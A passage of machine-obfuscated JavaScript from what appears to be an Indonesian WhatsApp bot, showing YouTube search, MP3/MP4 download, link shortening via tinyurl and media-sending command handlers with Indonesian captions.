_0x619cf6=_0x473a3e(0x75c,0x4b4,0x7b5,0x280)+_0x473a3e(0xc08,0x8ff,0xbc0,0x556)+_0x5ad859(0x76b,0x55f,0x4cb,0x2f9)+_0x5ad859(0xd0e,0x5ef,0x966,0x8b6)+_0x15a8f3+(_0x5ad859(0x767,0x70f,0x57d,0x38e)+'P4\x0a🤠\x20ID\x20:\x20')+yut[_0x5ad859(0xa7e,0x998,0xcc7,0xf66)][0x26fb+-0x1*0x69b+-0x2060][_0x5ad859(0x105d,0xbf8,0xd38,0xd51)]+(_0x473a3e(0xbde,0x8ed,0xaeb,0xa35)+':\x20')+yut[_0x473a3e(0x95b,0x7ea,0x3b6,0x9da)][0xa*0x3f+0x3*0x2ea+-0xb34][_0x5ad859(0xb14,0xf70,0xb69,0xe68)]+(_0x473a3e(0x187,0x258,0x464,0x57f)+'\x20')+_0x409d52+(_0x473a3e(0x2ca,0x2f3,0x46c,0x205)+':\x20')+yut[_0x473a3e(0x88c,0x7ea,0xb68,0x4ac)][0x1*0x1cb1+-0x13dd+-0x8d4][_0x473a3e(0x8dc,0x6ad,0x62b,0x987)]+(_0x5ad859(0x4eb,0x6f3,0x5c5,0x658)+'on\x20:\x20')+yut[_0x473a3e(0x4d6,0x7ea,0xb21,0x4c3)][-0x9e*-0x3d+-0x8b7*-0x2+-0x3714][_0x5ad859(0xa10,0x7bf,0x971,0xb6f)]+'\x0a🌀\x20Url\x20:\x20'+yut[_0x5ad859(0xdfb,0xb82,0xcc7,0xaaf)][0xe2+-0x5d5*-0x1+0x3*-0x23d]['url'];let _0x3788f0=await getBuffer(_0x4a6872);const _0x2412ef={};function _0x5ad859(_0x45aa22,_0x5a4e59,_0x45b2d9,_0x25f8d9){return _0x22109a(_0x45aa22-0x1f2,_0x5a4e59-0x27,_0x5a4e59,_0x45b2d9-0x488);}_0x2412ef[_0x473a3e(0x548,0xc7,-0x1f6,0x195)+'t']=_0x1dd62e['SIyDR'];const _0x530783={};_0x530783[_0x5ad859(0xddf,0xa2f,0xbeb,0xf66)]=_0x5ad859(0xc87,0xa30,0x96f,0xb77)+args[-0x1*0x1cba+-0x2*0x91d+0x4*0xbbd],_0x530783[_0x473a3e(0x484,0x443,0x36d,0x801)]=_0x2412ef,_0x530783[_0x473a3e(0x74e,0x795,0xac4,0x828)]=_0x1dd62e['eQKcH'];const _0x2c0818={};_0x2c0818[_0x5ad859(0x1c4,0x37c,0x5a4,0xa58)+'t']=_0x1dd62e['ELJYi'];const _0x2d94c0={};_0x2d94c0[_0x5ad859(0xbfd,0xa68,0xbeb,0xd8e)]=_0x5ad859(0x6c2,0x7ae,0x59d,0x8ec)+args[0x1*0x17c2+0xbbc+0x1*-0x237e],_0x2d94c0[_0x5ad859(0x62a,0x704,0x920,0xb15)]=_0x2c0818,_0x2d94c0[_0x473a3e(0x92d,0x795,0x982,0x7aa)]=_0x1dd62e[_0x5ad859(0x7ec,0x9e2,0x5ac,0x789)];function _0x473a3e(_0x1cb776,_0x4b6b96,_0x370615,_0x8656c1){return _0x2d0e6d(_0x8656c1,_0x4b6b96-0x1cc,_0x370615-0x1f,_0x4b6b96-0x51);}let _0x3a0e7a=[_0x530783,_0x2d94c0];sendButLocation(from,_0x619cf6,'NOTE\x20！'+enter+(_0x473a3e(0x8fd,0x589,0x695,0x1d2)+_0x5ad859(0xb5f,0x7b5,0xb45,0x727)+_0x5ad859(0x9d3,0x11fc,0xd6d,0xb37)+_0x5ad859(0xaa5,0x6a9,0x7cf,0xa31)+'ton\x20silahk'+_0x473a3e(0x3ef,0x61b,0x831,0x9a1)+_0x473a3e(0x3f3,0x5f6,0x3b7,0x900)+'https://yo'+'utu.be/ERG'+_0x5ad859(0x2d3,0x6c5,0x6a3,0xa2d))+enter+enter+botname+_0x473a3e(0x998,0x908,0x5b9,0xb81)+ownername,_0x3788f0,_0x3a0e7a,{});});});}catch(_0x4a98de){reply(mess[_0x1f7707(0xa8,0x27d,-0x1b4,0x98)][_0x1f7707(0x10d,-0x32d,-0x2d1,-0x5af)]);}break;case _0x39f25f(0xc57,0x7c6,0x71a,0x623):{if(args['length']===0x1281+0x13*-0xed+-0xea)return reply(_0x1f7707(0x332,0x1d3,0x134,0x39a)+'ntah\x20*'+prefix+('video*\x20_Ju'+_0x1f7707(0x491,0x4ed,0xad,0x286)+'yang\x20akan\x20'+_0x39f25f(-0xcb,0x33c,0x382,0x203)));var srch=args[_0x1f7707(-0x4e,0x476,0x2bf,0x601)]('');aramas=await yts(srch),server=_0x1f7707(0x86f,0x9a8,0x57b,0x77f),aramat=aramas[_0x39f25f(0x3cd,0x847,0x9f7,0x9ea)];var mulaikah=aramat[0x25bf+-0x1254+-0x1*0x136b][_0x1f7707(0x520,0x3fd,0x194,-0x191)];try{ytv2(mulaikah,server)[_0x1f7707(0x5b8,0x49e,0x234,0x64b)](_0x1c7b4c=>{const _0x43d8ed={'kGwwA':_0x4b80f9(0xdf6,0x56a,0x57b,0x989),'FQhFU':function(_0x4bf7aa,_0x32a063,_0x3caa3e){return _0x4bf7aa(_0x32a063,_0x3caa3e);},'onbJg':_0x59010a(0x583,0x6cc,0x192,0xfb)+'ta','hXmxL':'HH:mm:ss','dLUZm':_0x4b80f9(0x902,0x8f5,0xe63,0xb81),'CITiA':function(_0x5b877b,_0x3bff4e){return _0x5b877b(_0x3bff4e);},'gpTde':_0x4b80f9(0x9de,0x6ce,0x750,0x532)+'E','wzsqg':function(_0x4eae1a,_0x56f82b){return _0x4eae1a(_0x56f82b);},'EQAIr':function(_0x15472c,_0x10d4af){return _0x15472c===_0x10d4af;},'hUvfh':'yQMPn','HbHQy':function(_0x254d58,_0x32d5fa){return _0x254d58>=_0x32d5fa;},'PuEeS':function(_0x1eb23c,_0x182e04,_0x5ed9c4,_0x3c50a3){return _0x1eb23c(_0x182e04,_0x5ed9c4,_0x3c50a3);},'RxFoA':function(_0x4d04a6,_0x54e966,_0x4f91ad,_0x56b9d0){return _0x4d04a6(_0x54e966,_0x4f91ad,_0x56b9d0);},'TEHwd':function(_0x5b03bc,_0x4301cf,_0x150bc3,_0x5f2f84){return _0x5b03bc(_0x4301cf,_0x150bc3,_0x5f2f84);}};function _0x59010a(_0x4af1e5,_0x1d4e97,_0x89940e,_0x1faeee){return _0x39f25f(_0x89940e,_0x4af1e5- -0x197,_0x89940e-0xdd,_0x1faeee-0xaa);}function _0x4b80f9(_0x56bfe4,_0xfec0d4,_0xfbe431,_0x243f1c){return _0x39f25f(_0x56bfe4,_0x243f1c-0x5c2,_0xfbe431-0x82,_0x243f1c-0x13d);}const {dl_link:_0x2e88c8,thumb:_0x248e6e,title:_0x5a922f,filesizeF:_0x54be62,filesize:_0x292346}=_0x1c7b4c;axios[_0x4b80f9(0x751,0x429,0x542,0x84a)](_0x4b80f9(0x9ac,0x72f,0x675,0x9c0)+_0x4b80f9(0x63c,0x75c,0x4e7,0x7ef)+_0x59010a(0x2b9,0x674,0x572,0x62f)+_0x59010a(0x4d1,0x96f,0x345,0x82b)+_0x2e88c8)['then'](async _0x484e9b=>{function _0x36c332(_0x370d6f,_0x20743c,_0x3ed13e,_0x494b64){return _0x4b80f9(_0x370d6f,_0x20743c-0x1cf,_0x3ed13e-0x185,_0x3ed13e- -0x419);}function _0x483bb5(_0x443542,_0x407446,_0x3e58f9,_0x381a4f){return _0x59010a(_0x443542- -0x1c,_0x407446-0x28,_0x3e58f9,_0x381a4f-0x4e);}if(_0x43d8ed['EQAIr'](_0x36c332(0x5f0,0xb7f,0x8bd,0x4bc),_0x43d8ed[_0x36c332(0x332,0x87d,0x46a,0x13c)])){const _0x23221c=_0x43d8ed[_0x36c332(0x6fc,0x854,0x8f5,0x74e)][_0x36c332(0xe0,0x117,0x565,0x280)]('|');let _0x59fbf6=0x8f3+0x1243+-0x1b36;while(!![]){switch(_0x23221c[_0x59fbf6++]){case'0':_0x1b5e9b=!![];continue;case'1':_0xa7edfb[_0x483bb5(0x3ec,0x91,0x5a4,0x176)](_0x43d8ed[_0x483bb5(0x683,0x2d6,0xb00,0x6dd)](_0xe9a23d,_0x1d4be0,_0x36c332(0xa31,0x4f2,0x88a,0xb0f)),_0x43d8ed[_0x483bb5(0x683,0x995,0x670,0x42d)](_0x5f1d22,_0x2d2150['tz'](_0x43d8ed[_0x36c332(0x4fe,0x3c1,0x33b,0x592)])['format'](_0x43d8ed[_0x36c332(0x67d,0x210,0x3ae,0x16b)]),_0x43d8ed[_0x483bb5(-0x15b,-0x200,-0x568,-0x4c)]),_0x43d8ed[_0x483bb5(-0xa8,0x357,0x3c,-0x1eb)](_0x1d2fb2,_0x43d8ed[_0x483bb5(0x3af,0x507,0x3bb,0x6e3)]));continue;case'2':if(!_0x55ba01[_0x36c332(0x316,0x416,0x2cc,0x2b2)][_0x36c332(0x775,0x8c8,0x667,0xa42)]&&!_0x1b2e72&&!_0xaf875c)return _0x43d8ed[_0x36c332(0x395,-0x106,0x2b4,0x1c7)](_0x49da96,_0x370136[_0x36c332(0x869,0x69d,0x430,0x1f3)]());continue;case'3':_0x43d8ed['wzsqg'](_0x31956c,'「\x20*SELF-MO'+'DE*\x20」');continue;case'4':if(_0x43d8ed[_0x36c332(0x21e,-0xc4,0x214,-0x11c)](_0x1c3bf3,!![]))return;continue;}break;}}else{if(_0x43d8ed['HbHQy'](_0x43d8ed[_0x483bb5(0x640,0xab0,0x30e,0x55b)](Number,_0x292346),-0x1447*0x22+-0x1*-0x2740f+0xfb*0x1cd))return _0x43d8ed[_0x483bb5(-0x28a,0xb8,-0x473,0x1b1)](sendMediaURL,from,_0x248e6e,_0x483bb5(0x23a,-0xee,0x5da,0x163)+_0x483bb5(-0x215,-0x290,0x1bf,0x1a9)+enter+enter+('🐣\x20*Title*\x20'+':\x20')+_0x5a922f+enter+(_0x36c332(-0xcf,-0x97,0x12d,0x26e)+'MP3')+enter+(_0x483bb5(0x347,0x4e2,0x60c,-0x122)+'e*\x20:\x20')+_0x54be62+enter+(_0x36c332(0x4f5,0x81a,0x835,0xaad)+':\x20')+_0x484e9b['data']+enter+enter+(_0x36c332(0x8ab,0xaf5,0x7f1,0x451)+_0x36c332(0x97c,0x9a6,0x90c,0x992)+'dari\x20batas'+_0x36c332(0x5ce,0x74c,0x338,0x117)+_0x483bb5(0x3de,0x299,0x36f,0x234)+_0x36c332(0x775,0xb65,0x805,0x886)));const _0x417fd6=_0x36c332(0x3f4,0x149,0x596,0x5a7)+_0x36c332(0x58f,-0x2af,0x147,-0xb5)+enter+enter+(_0x36c332(0x6a7,0x68d,0x280,0x54c)+':\x20')+_0x5a922f+enter+enter+('🦁\x20*Ext*\x20:\x20'+_0x36c332(0xb4c,0x9dd,0x772,0x821))+enter+(_0x36c332(0xeb,-0x1ba,0x1f1,-0xba)+'\x20')+_0x54be62+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x484e9b['data']+enter+enter+(_0x36c332(0x873,0x5ce,0x9e8,0xd0d)+'tunggu\x20fil'+'e\x20media\x20se'+_0x483bb5(-0x271,0x47,-0xac,0xc3)+_0x36c332(0x6c9,0x84e,0x4e9,0x54c)+_0x483bb5(0x608,0xa93,0x7fd,0x9a4)+'erapa\x20meni'+'t_');_0x43d8ed[_0x483bb5(0x39e,0x2ab,0x822,0xc6)](sendMediaURL,from,_0x248e6e,_0x417fd6);const _0x3a073d={};_0x3a073d['mimetype']='audio/mp4',_0x3a073d[_0x36c332(0xad7,0xb4c,0x985,0xd0b)]=_0x5a922f+'.mp3',_0x3a073d['quoted']=fgclink2,_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o']={},_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o']['forwarding'+'Score']=0x1fc,_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x36c332(0x327,0x3cb,0x206,0x29f)+'d']=!![],_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)]={},_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)][_0x36c332(-0x242,0x113,0x91,-0x167)]=_0x5a922f,_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)]['body']='',_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)][_0x483bb5(0x3b5,0x6a7,0x6a3,0x29c)]='2',_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)][_0x483bb5(0x54e,0x92c,0x58f,0x26c)]=pp_userz,_0x3a073d[_0x36c332(0xc04,0x91b,0x886,0x587)+'o'][_0x483bb5(-0x25d,0xbe,-0x555,0x260)+_0x36c332(0x1c3,-0x76,0x41a,0x42b)][_0x36c332(0x6b7,0xa12,0x788,0x687)]=_0x36c332(0xb21,0x667,0x973,0xd26)+'utube.com/'+_0x36c332(0x43e,0x69e,0x55a,0x414)+'c',await _0x43d8ed[_0x483bb5(0x93,-0x66,0xf0,-0x3e6)](sendFileFromUrlF,_0x2e88c8,document,_0x3a073d)['catch'](()=>reply(_0x483bb5(0x479,0x704,0x36b,0x553)));}});});}catch(_0x5c878b){reply(mess[_0x39f25f(-0x43,-0x6,-0x3ac,0x141)][_0x1f7707(-0x732,-0x558,-0x2d1,-0x2ac)]);}}break;case _0x39f25f(0x956,0x832,0xcef,0xc47):if(args[_0x39f25f(0x942,0x67a,0x28d,0x237)]===-0x28*0xd4+0x1*-0x843+0x2963)return reply(_0x39f25f(0x4c1,0x2e2,0x425,0xbc)+_0x39f25f(0x375,0x603,0x193,0x816)+prefix+(_0x1f7707(-0x10e,0x1bf,0x372,-0x3)+_0x39f25f(0x571,0x2be,0x692,0x680)));let isLinks=args[-0x7e0+0x4*0x934+-0x1cf0][_0x1f7707(-0x68d,-0xd4,-0x2c2,-0x617)](/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/);if(!isLinks)return reply(mess[_0x1f7707(-0x280,-0x5b,-0x1b4,0x2b4)]['Iv']);try{reply(lang[_0x39f25f(0x44c,0x22a,-0x24b,0x33f)]());let yut=await yts(args[0x2*0x6c7+0x15*-0x14c+0xdae]);yta(args[-0x43*0x34+-0x136f+0x210b])[_0x1f7707(0x102,0x441,0x234,0x235)](_0x495a12=>{const _0x44028c={'qAMTH':function(_0x42fcf1,_0x1ea8cb){return _0x42fcf1>=_0x1ea8cb;},'iaLZE':function(_0x53ab57,_0x4c7629){return _0x53ab57(_0x4c7629);},'oWlKU':function(_0x21a968,_0x3178b5){return _0x21a968(_0x3178b5);},'xQdHR':_0x57119c(0x4f7,0x2bd,0x766,0x538),'mHLik':_0x57119c(0xd86,0x8e2,0x716,0x8c6),'kINGA':_0x2ab004(-0x60,0x39f,0x4fe,-0x10b),'lBvFD':function(_0xd20712,_0x80c397,_0x4d3d3e,_0x52a999,_0x211ffc,_0x3fce1d,_0x1c5c92){return _0xd20712(_0x80c397,_0x4d3d3e,_0x52a999,_0x211ffc,_0x3fce1d,_0x1c5c92);}},{dl_link:_0x4fbbdd,thumb:_0x33e2d3,title:_0x980160,filesizeF:_0x2e0a99,filesize:_0x268f02}=_0x495a12;function _0x2ab004(_0x11671b,_0x5d98ab,_0x60d282,_0x16236a){return _0x1f7707(_0x11671b-0x1f,_0x16236a,_0x5d98ab-0x16c,_0x16236a-0x0);}function _0x57119c(_0x5248c4,_0x383401,_0x2214a6,_0x24ce54){return _0x1f7707(_0x5248c4-0x41,_0x5248c4,_0x383401-0x58b,_0x24ce54-0x16a);}axios[_0x2ab004(0x34e,0x246,0x615,0x391)]('https://ti'+'nyurl.com/'+_0x2ab004(0x7cb,0x40e,0x34b,0x4b5)+_0x2ab004(0x7cc,0x626,0xac2,0x7d1)+_0x4fbbdd)[_0x2ab004(-0xa4,0x3a0,-0x118,0x280)](async _0x1e0c18=>{if(_0x44028c['qAMTH'](_0x44028c[_0x264f11(0x729,0x5b4,0x443,0x446)](Number,_0x268f02),-0x8d7e+-0x8f83+0x19231))return sendMediaURL(from,_0x33e2d3,'*Data\x20Berh'+'asil\x20Didap'+'atkan!*'+enter+enter+'🐣\x20Title\x20:\x20'+_0x980160+enter+(_0x264f11(0x14f,0x210,0x4b3,0x3cd)+'3')+enter+('🐭\x20Filesize'+'\x20:\x20')+_0x2e0a99+enter+_0x31a4b(0x48c,0x75e,0x46b,0x521)+_0x1e0c18['data']+enter+enter+(_0x264f11(0x83f,0xab5,0xd9d,0xa5c)+_0x31a4b(0xf59,0xa88,0xc60,0xb2a)+'dari\x20batas'+'\x20disajikan'+_0x31a4b(0x7ed,0xa73,0xa8e,0x81f)+'tuk\x20link_'));const _0x1b55f2=_0x264f11(0xd8c,0x894,0x9bc,0x916)+_0x31a4b(0x6e3,0x577,0x8ba,0xb93)+_0x31a4b(0x3b9,0x29f,0x406,0x17)+':\x20'+_0x980160+(_0x31a4b(0x2a6,0x39,0x4d6,0xb1)+_0x31a4b(0xe61,0xb2c,0xd31,0xa23))+yut['videos'][0x21b0+0x3*0x13f+-0xb*0x367][_0x264f11(0x8eb,0xf84,0x836,0xba8)]+(_0x31a4b(0xe70,0xa70,0xd23,0x105b)+':\x20')+yut[_0x264f11(0xa33,0xbf0,0xd2d,0xb37)][0x19d+0x1*-0x227f+0x6*0x57b]['ago']+(_0x264f11(0x7be,0x347,0xa49,0x5a5)+'\x20')+_0x268f02+('\x20kb\x0a🍃\x20View'+'s:\x20')+yut[_0x31a4b(0xec5,0xc08,0xc20,0x99c)][-0x1a42+-0x1085*0x1+-0x2f*-0xe9][_0x264f11(0xaa5,0xa48,0x93d,0x9fa)]+(_0x31a4b(0x273,0x3b4,0x51e,0x86e)+_0x264f11(0x759,0x5bc,0x6c2,0x935))+yut[_0x31a4b(0x9d7,0xdb0,0xc20,0x898)][-0x115+-0x2a*-0x37+-0x7f1][_0x31a4b(0xce4,0xb56,0x8ca,0xa6a)]+_0x264f11(0xabe,0x7ac,0x994,0x90f)+yut[_0x264f11(0xf8d,0xfe6,0xf05,0xb37)][-0x1b89+0x9ea+0x15b*0xd][_0x264f11(0x9ae,0x2cf,0xa72,0x756)];let _0x329b9a=await _0x44028c[_0x264f11(0x884,0x833,0x37b,0x73c)](getBuffer,_0x33e2d3);const _0x361372={};_0x361372[_0x31a4b(0x77,0x34b,0x4fd,0x2c7)+'t']=_0x44028c[_0x264f11(0x314,0x667,0x2ab,0x4ec)];const _0x25853f={};_0x25853f['buttonId']=_0x31a4b(0xf48,0x776,0xafe,0x813)+q;function _0x264f11(_0x2a9721,_0x4d5b35,_0x645b77,_0xa11607){return _0x57119c(_0x645b77,_0xa11607-0x37,_0x645b77-0x59,_0xa11607-0x10);}_0x25853f[_0x31a4b(0xcfe,0x479,0x879,0x46a)]=_0x361372,_0x25853f[_0x264f11(0x921,0x9f8,0x928,0xae2)]=_0x44028c['mHLik'];const _0x1cba7e={};_0x1cba7e[_0x264f11(0x8c6,0x6fa,0x445,0x414)+'t']=_0x44028c[_0x264f11(0x67a,0x710,0x666,0x5bb)];const _0x1d92ce={};_0x1d92ce[_0x264f11(0x7e3,0xe79,0x6a4,0xa5b)]=_0x31a4b(0x273,0x7fa,0x6d2,0x684)+q,_0x1d92ce['buttonText']=_0x1cba7e,_0x1d92ce[_0x31a4b(0xfff,0xca1,0xbcb,0xb18)]=_0x44028c[_0x31a4b(0xc53,0xd42,0x9fd,0x8d3)];function _0x31a4b(_0x1809c1,_0x7b8d15,_0x4646bc,_0x13b7a9){return _0x57119c(_0x1809c1,_0x4646bc-0x120,_0x4646bc-0x161,_0x13b7a9-0xf7);}let _0x3d4874=[_0x25853f,_0x1d92ce];_0x44028c[_0x31a4b(0x6b5,0x83c,0xa5a,0x964)](sendButLocation,from,_0x1b55f2,_0x264f11(0x579,0xa06,0x475,0x8dc)+enter+(_0x31a4b(0xcf4,0xd95,0x9bf,0x811)+_0x31a4b(0xf16,0x961,0xa9e,0xafd)+'mu\x20belum\x20s'+_0x31a4b(0x928,0x81f,0x728,0x28e)+_0x264f11(0x532,0x673,-0x76,0x427)+_0x264f11(0xa7a,0x6d9,0xe16,0x968)+_0x31a4b(0xb01,0x694,0xa2c,0xb99)+'https://yo'+_0x264f11(0x3c7,0x7f5,0x700,0x3d4)+'ID4Fmo9w')+enter+enter+botname+_0x31a4b(0x931,0xb15,0xd3e,0xf4f)+ownername,_0x329b9a,_0x3d4874,{});});});}catch(_0x3cfd29){reply(mess[_0x1f7707(-0x45,0x67,-0x1b4,0x23e)][_0x39f25f(0x306,-0x123,-0x51e,-0x328)]);}break;case _0x1f7707(0x112,-0x209,0x1e,-0x37e):{if(args[_0x39f25f(0x50f,0x67a,0x977,0x826)]===-0x1*0x143b+0x17a1+-0x366)return reply('Kirim\x20peri'+_0x39f25f(0x7eb,0x603,0x784,0x5f8)+prefix+(_0x1f7707(0x32d,0x88e,0x3f6,0x845)+'dul\x20video\x20'+_0x39f25f(0x866,0x7fd,0x824,0x569)+_0x1f7707(-0x48,-0x1cd,0x18e,0x141)));var srch=args[_0x39f25f(0x7a8,0x46d,0x6f6,0x3b4)]('');aramas=await yts(srch),server='en68',aramat=aramas[_0x1f7707(0x2d8,0x48a,0x699,0x4d7)];var mulaikah=aramat[0x1ecb+-0x1*-0x2006+-0x4d5*0xd]['url'];try{ytv2(srch,server)['then'](_0x57e84c=>{const _0xc0a040={'zEbna':function(_0x1402ac,_0x24d6ca){return _0x1402ac(_0x24d6ca);},'jkqVw':'Emror','JDehB':function(_0x44b884,_0x373400){return _0x44b884(_0x373400);},'EtIzc':function(_0x33847f,_0x374f8e,_0x4e72ae,_0x51b058){return _0x33847f(_0x374f8e,_0x4e72ae,_0x51b058);}};function _0x3f3b01(_0x1acc2a,_0x11cfae,_0x4d2c66,_0x36d33f){return _0x39f25f(_0x11cfae,_0x1acc2a-0x1f0,_0x4d2c66-0x182,_0x36d33f-0xcb);}const {dl_link:_0x54caf7,thumb:_0x567202,title:_0x529ac8,filesizeF:_0x58c9d9,filesize:_0x2e9e5b}=_0x57e84c;function _0x46c60c(_0x3768b6,_0x5587c0,_0x18611d,_0xf0ddca){return _0x1f7707(_0x3768b6-0x18d,_0xf0ddca,_0x5587c0- -0xb,_0xf0ddca-0xbe);}axios[_0x46c60c(0x342,0xcf,0x4c3,0x543)](_0x46c60c(-0x1a8,0x245,0x6c3,-0xa0)+'nyurl.com/'+_0x3f3b01(0x640,0x425,0x1d0,0xa1e)+_0x46c60c(0x889,0x4af,0x51f,0x54d)+_0x54caf7)[_0x46c60c(-0x6b,0x229,-0x283,-0xa3)](async _0x54aeb5=>{function _0x559b3c(_0x15ac05,_0x36ff86,_0x5a7930,_0x1fcbe9){return _0x46c60c(_0x15ac05-0xe0,_0x5a7930-0x18e,_0x5a7930-0x13b,_0x36ff86);}if(_0xc0a040['JDehB'](Number,_0x2e9e5b)>=-0x188a9+0x2122c*0x1+0xfd1d*0x1)return _0xc0a040[_0x2f27c1(0x2ba,0x33,-0x1c4,0xa8)](sendMediaURL,from,_0x567202,'*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+'*'+enter+enter+(_0x2f27c1(0x3a0,-0x374,-0x27e,0xb3)+':\x20')+_0x529ac8+enter+(_0x2f27c1(0x44,0x3b8,-0x30c,-0xa0)+_0x2f27c1(-0xe1,0x217,0xf6,-0x144))+enter+(_0x559b3c(0x229,0x799,0x4cf,0xd3)+_0x2f27c1(0x334,0x2b8,-0x330,0x97))+_0x58c9d9+enter+(_0x559b3c(0x209,0x3c,-0x100,0x6)+'\x20')+_0x54aeb5[_0x2f27c1(0x97a,0x686,0x7ab,0x4ef)]+enter+enter+(_0x559b3c(0x501,0x930,0x61d,0x1c6)+_0x559b3c(0x87a,0x5c6,0x738,0x9e0)+_0x2f27c1(0xaad,0xa2d,0xa4b,0x7bf)+_0x2f27c1(-0x96,-0x2f6,0x7d,0x16b)+_0x559b3c(0x334,0x460,0x566,0x53e)+_0x559b3c(0x239,0x687,0x631,0x575)));function _0x2f27c1(_0x17e827,_0x15e08a,_0x11abc7,_0x1ee83b){return _0x46c60c(_0x17e827-0x7d,_0x1ee83b-0x195,_0x11abc7-0xf1,_0x11abc7);}_0xc0a040[_0x2f27c1(0x15e,0x17e,0x535,0xa8)](sendMediaURL,from,_0x54caf7,'')[_0x559b3c(0x6eb,0x9e7,0x6ce,0x778)](_0x31e077=>{function _0x1795c3(_0x72ff1d,_0x5c47b2,_0x501a8d,_0x12fb07){return _0x559b3c(_0x72ff1d-0x148,_0x501a8d,_0x5c47b2-0x5fc,_0x12fb07-0x161);}function _0x30c19a(_0x477b89,_0x516f0f,_0x4d1c0d,_0x236f3e){return _0x2f27c1(_0x477b89-0x19,_0x516f0f-0x65,_0x4d1c0d,_0x516f0f-0x5c5);}_0xc0a040[_0x1795c3(0xb64,0xd5f,0xc1e,0xd25)](reply,_0xc0a040[_0x1795c3(0xabf,0xb3f,0x871,0x82f)]);});});});}catch(_0x132043){reply(mess[_0x39f25f(-0x46c,-0x6,0x3c8,0x437)][_0x39f25f(-0x487,-0x123,-0x55f,-0x2d8)]);}}break;case _0x1f7707(-0x317,0x6a,-0x78,-0x532):{if(args[_0x39f25f(0x4f1,0x67a,0x9e6,0x45b)]===-0xb4+-0x1*0x218f+0x7*0x4e5)return reply(_0x39f25f(0x67,0x2e2,0x17a,0x573)+'ntah\x20*'+prefix+(_0x1f7707(0x7c9,0x32b,0x3f6,0x31f)+'dul\x20video\x20'+_0x1f7707(0x9ad,0x9b8,0x64f,0xa20)+_0x1f7707(0x3a2,-0x32a,0x18e,0xc8)));var srch=args[_0x1f7707(-0x166,0x36f,0x2bf,0x149)]('');aramas=await yts(srch),server=_0x39f25f(0x5ff,0x729,0x7db,0xbc9),aramat=aramas[_0x39f25f(0xa1a,0x847,0x4db,0x83a)];var mulaikah=aramat[0x51b*-0x7+-0x1*-0x1a42+0x97b]['url'];try{ytv2(srch,server)[_0x39f25f(0x5f3,0x3e2,-0xdb,0x7f4)](_0x360e92=>{const _0x4583f2={'yluBs':function(_0x2c595c,_0x39737c){return _0x2c595c>=_0x39737c;},'cdtAO':function(_0x2b63e6,_0x4a55a6){return _0x2b63e6(_0x4a55a6);},'ZdXPx':function(_0x4878f6,_0xc677a0){return _0x4878f6(_0xc677a0);},'KROzJ':_0x2c6cf8(0x7fe,0x724,0xb09,0x2b6)+'utu.be/1r_'+_0x131cb7(0x3b2,-0x42,0x1f2,0x772),'LdErt':_0x131cb7(0x55e,0x651,0x24b,0x69b)};function _0x2c6cf8(_0x322603,_0x3f95b4,_0x3c607c,_0x572b46){return _0x39f25f(_0x322603,_0x3f95b4- -0xa6,_0x3c607c-0x10f,_0x572b46-0x140);}const {dl_link:_0x539482,thumb:_0x43ab7e,title:_0xba3acc,filesizeF:_0x16827d,filesize:_0x5c828b}=_0x360e92;function _0x131cb7(_0x3f2282,_0x2e0865,_0x446ca8,_0x411eaa){return _0x1f7707(_0x3f2282-0x1a2,_0x2e0865,_0x3f2282-0x612,_0x411eaa-0xb5);}axios[_0x131cb7(0x6ec,0x51e,0xb98,0x69c)]('https://ti'+_0x2c6cf8(0x48b,0x187,0x588,0x173)+_0x2c6cf8(0x399,0x3aa,0x170,0x515)+_0x2c6cf8(0x676,0x5c2,0x48c,0x53c)+_0x539482)[_0x2c6cf8(0x539,0x33c,0x62a,0x7c7)](async _0x212d42=>{if(_0x4583f2[_0x1253f4(0x42a,0x765,0x2b6,0x3cf)](_0x4583f2[_0x7b773e(0x67b,0x454,0x568,0x2cd)](Number,_0x5c828b),0xcf1c+-0xe3e0+0x19b64))return sendMediaURL(from,_0x43ab7e,_0x7b773e(0x572,0x533,0x6d4,0x54b)+'-PLAY\x20MP4*'+'*'+enter+enter+(_0x7b773e(0x415,0x265,0xc5,0x235)+':\x20')+_0xba3acc+enter+(_0x7b773e(-0x72,0x26e,0x46b,0xe2)+_0x7b773e(0x169,-0x447,-0x41a,0x3e))+enter+(_0x7b773e(0x4be,0x761,0x6ec,0x658)+_0x1253f4(0x334,0x331,0x624,0x328))+_0x16827d+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x212d42[_0x7b773e(0x4a3,0x58c,0x454,0x671)]+enter+enter+(_0x1253f4(0x5fc,0x8be,0xcd4,0x9cc)+_0x1253f4(0xe02,0x9d9,0x80f,0xad0)+_0x7b773e(0x7ff,0xa2b,0xd36,0x941)+_0x7b773e(0x73b,0x57,0x142,0x2ed)+_0x7b773e(0x52e,0x474,0x50a,0x6ef)+_0x1253f4(0xb8c,0x8d2,0xbe6,0xc49)));let _0xf7ea01=await _0x4583f2[_0x1253f4(0x791,0x8d7,0xc49,0xbfc)](getBuffer,_0x539482);const 